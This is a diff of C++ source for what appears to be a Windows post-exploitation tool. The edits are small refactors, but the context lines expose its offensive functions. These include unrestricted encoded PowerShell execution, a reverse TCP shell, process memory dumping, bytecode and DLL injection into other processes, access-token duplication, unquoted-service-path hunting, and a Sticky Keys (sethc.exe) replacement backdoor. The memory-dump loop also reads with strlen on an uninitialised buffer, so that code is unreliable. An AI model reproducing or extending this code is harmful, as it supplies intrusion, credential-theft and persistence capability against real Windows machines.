@@ -16,7 +16,7 @@
 
 #define BUFFER_SIZE 1024
 
-// -------------------- MISCLENIOUS --------------------
+// -----------------------------------------------------
 
 std::string intToStr(int num) {
 	char str[10];
@@ -62,18 +62,34 @@ bool isPositiveNumber(std::string str) {
 	return str.find_first_not_of("0123456789") == std::string::npos;
 }
 
-// ---------------------- INVOKER ----------------------
+// -----------------------------------------------------
 
-// TO DO: Check if command processor is accessible.
+bool isCmdAccessible() {
+	bool success = false;
+	if (system("echo \"Invoker\" 1>nul") == 0) {
+		success = true;
+	}
+	else {
+		print("Cannot access the command processor");
+	}
+	return success;
+}
+
 void cmdExec(std::string command) {
-	command = command.length() > 0 ? "CMD /K \"" + command + "\"" : "CMD";
-	system(command.c_str());
+	if (isCmdAccessible()) {
+		command = command.length() > 0 ? "CMD /K \"" + command + "\"" : "CMD";
+		system(command.c_str());
+	}
 }
 
-void psExec(std::string encoded) {
-	std::string command = "PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand " + encoded;
-	system(command.c_str());
+void psExec(std::string command) {
+	if (isCmdAccessible()) {
+		command = command.length() > 0 ? "PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand " + command : "PowerShell -ExecutionPolicy Unrestricted -NoProfile";
+		system(command.c_str());
+	}
 }
+
+// -----------------------------------------------------
 
 bool createFile(std::string file, std::string data) {
 	bool success = false;
@@ -111,7 +127,7 @@ std::string readFile(std::string file) {
 	return data;
 }
 
-bool writeFile(std::string file, std::string data) {
+bool appendFile(std::string file, std::string data) {
 	bool success = false;
 	std::ofstream stream(file.c_str(), (std::ios::app | std::ios::binary));
 	if (stream.fail()) {
@@ -146,6 +162,8 @@ bool downloadFile(std::string url, std::string out) {
 	}
 	return success;
 }
+
+// -----------------------------------------------------
 
 bool editRegKey(PHKEY hKey, std::string subkey, std::string name, std::string data) {
 	bool success = false;
@@ -279,7 +297,9 @@ bool reverseTcp(std::string ip, int port) {
 	return success;
 }
 
-// NOTE: Returns true if 32-bit.
+// -----------------------------------------------------
+
+// NOTE: Returns true if it is a 32-bit process.
 WINBOOL isWow64(int pid) {
 	WINBOOL success = false;
 	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
@@ -399,7 +419,7 @@ bool dumpProcessMemory(int pid) {
 		while (VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi))) {
 			if (mbi.AllocationProtect != PAGE_GUARD && mbi.Protect != PAGE_GUARD && mbi.AllocationProtect != PAGE_NOACCESS && mbi.Protect != PAGE_NOACCESS) {
 				char* buffer = new char[mbi.RegionSize];
-				if (ReadProcessMemory(hProcess, addr, buffer, strlen(buffer), NULL) != 0 && GetLastError() != 18 && writeFile(file, buffer) != 0) {
+				if (ReadProcessMemory(hProcess, addr, buffer, strlen(buffer), NULL) != 0 && GetLastError() != 18 && appendFile(file, buffer) != 0) {
 					success = true;
 				}
 				delete[] buffer;
@@ -416,6 +436,8 @@ bool dumpProcessMemory(int pid) {
 	}
 	return success;
 }
+
+// -----------------------------------------------------
 
 // NOTE: This method does not yet support HTTPS.
 std::string getWebContent(std::string url, int port, std::string method) {
@@ -546,6 +568,8 @@ bool injectBytecode(int pid, std::string bytecode) {
 	return success;
 }
 
+// -----------------------------------------------------
+
 bool injectDll(int pid, std::string file) {
 	bool success = false;
 	HANDLE hProcess = OpenProcess((PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD), 0, pid);
@@ -662,6 +686,8 @@ HANDLE createHookThread(struct hook* info) {
 	return hThread;
 }
 
+// -----------------------------------------------------
+
 void enableAccessTokenPrivs() {
 	HANDLE hProcess = GetCurrentProcess();
 	if (hProcess == NULL) {
@@ -774,6 +800,8 @@ HANDLE duplicateAccessToken(int pid) {
 	}
 	return dToken;
 }
+
+// -----------------------------------------------------
 
 // NOTE: This method will allocate a lot of additional process memory.
 // NOTE: This method will only search for unquoted service paths outside of \Windows\ directory.
@@ -939,6 +967,8 @@ bool manageService(std::string name, int mode) {
 	}
 	return success;
 }
+
+// -----------------------------------------------------
 
 // NOTE: To restore the backup, rename "sethc_backup.exe" back to "sethc.exe".
 bool replaceStickyKeys() {
